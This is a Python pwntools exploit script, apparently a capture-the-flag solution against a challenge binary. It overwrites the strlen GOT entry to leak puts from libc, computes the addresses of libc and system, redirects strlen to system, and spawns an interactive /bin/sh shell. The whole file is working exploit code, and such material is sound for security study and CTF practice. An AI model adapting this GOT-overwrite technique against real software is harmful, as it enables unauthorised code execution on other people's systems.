from pwn import *

libc = ELF("./libc.so.6")

EXE_FILENAME = "./chall.elf_patched"
exe = ELF(EXE_FILENAME)
context.binary = exe

#p = gdb.debug([EXE_FILENAME], gdbscript='''
#	b *edit_nft+58
#	b *edit_compliment+55
#	''')

# p = remote("tcp.sasc.tf", 10097)
p = process(EXE_FILENAME)

one_gadget = 0x11ab67

def write(addr, s):
	p.sendline(b"n")
	p.recvuntil(b": ")
	p.sendline(str(addr).encode())
	p.recvuntil(b": ")
	p.sendline(b"c")
	p.recvuntil(b": ")
	p.sendline(flat(s))

print(f"Puts: {exe.got.puts}")

p.recvuntil(b": ")
p.sendline(b"c")
p.recvuntil(b": ")
p.sendline(b"fjaosjgosfas")
p.recvuntil(b": ")
write(exe.got.strlen, exe.plt.puts)
p.sendline(b"n")
p.recvuntil(b": ")
p.sendline(str(exe.got.puts).encode())
p.recvuntil(b": ")

p.sendline(b"p")
p.recvuntil(b"Enter your choice (n/c/p):")
p.recvline()
res = p.recvline().replace(b"\n", b"")
p.recvuntil(b": ")
p.sendline(b"c")
p.recvuntil(b": ")
p.sendline(b"fjaosjgosfas")
p.recvuntil(b": ")


res = int.from_bytes(res, byteorder="little")
libc_base = res - libc.symbols.puts

print(f"Leaked Puts: {hex(res)}")
print(f"Libc Base: {hex(libc_base)}")
print(f"System: {hex(libc_base + libc.symbols.system)}")

one_gadget = libc_base + one_gadget

system = libc_base + libc.symbols.system

system_0 = system & 0xffffffff
system_1 = (system >> 32 ) & 0xffffffff

print(f"System 1: {hex(system_1)}")
print(f"System_0: {hex(system_0)}")

write(exe.got.strlen, system_0)
write(exe.got.strlen+0x4, system_1)
write(0x0000000000404060, b"/bin/sh\x00")

p.recvuntil(b"Enter your choice (n/c/p): ")
p.recvuntil(b"Enter your choice (n/c/p): ")
p.sendline(b"p")

p.interactive()